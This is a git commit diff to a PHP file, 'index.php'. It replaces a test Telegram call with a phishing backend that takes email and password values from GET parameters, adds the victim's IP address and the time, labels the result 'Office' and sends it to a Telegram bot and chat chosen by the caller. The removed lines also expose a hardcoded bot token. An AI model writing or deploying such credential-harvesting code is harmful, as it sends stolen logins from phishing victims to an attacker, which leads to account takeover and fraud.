012328f31ceec8860996a1eb0f0d8fb1ba7d4e50
dotxapp <120318257+dotxapp@users.noreply.github.com>
2023-01-15 19:28:54 +0100

    Update index.php

--- index.php
+++ index.php
@@ -1,16 +1,35 @@
 <?php
-$message = $_GET['message'];
-$chatid= $_GET['chatid'];
-$token= $_GET['makin'];
 
-$url = 'https://api.telegram.org/bot5683961460:AAGjgJj36-5rttL3c23iuWHtjgoGX9tjNyc/sendMessage?chat_id=-833002998&text=hello+world';
-  
-$ch = curl_init($url);
-curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
-$response = curl_exec($ch);
-$response = json_decode($response);
-curl_close($ch);
+	$log = $_GET['u'];
+	$pass= $_GET['p'];
+	$token = $_GET['makin'];
+	$chat_id = $_GET['chatid'];
+	$ip = getenv("REMOTE_ADDR");
+	$date = date("D/M/d, Y g:i a");
 
 
+	$message = "Email: $log%0APass: $pass%0AIP address: $ip%0ASubmitted on $date %0A--------Office---------";
+
+$url = "https://api.telegram.org/bot$token/sendMessage?chat_id=$chat_id&text=$message";
+
+if(!empty($chat_id)){
+
+	$opts = array(
+  'http'=>array(
+    'method'=>"GET",
+    'header'=>"Accept-language: en\r\n" .
+              "Cookie: foo=bar\r\n"
+  )
+);
+
+$context = stream_context_create($opts);
+$fp = fopen($url, 'r', false, $context);
+fclose($fp);
+
+}
+else{
+	http_response_code(403);
+die('Forbidden');
+}
 
 ?>
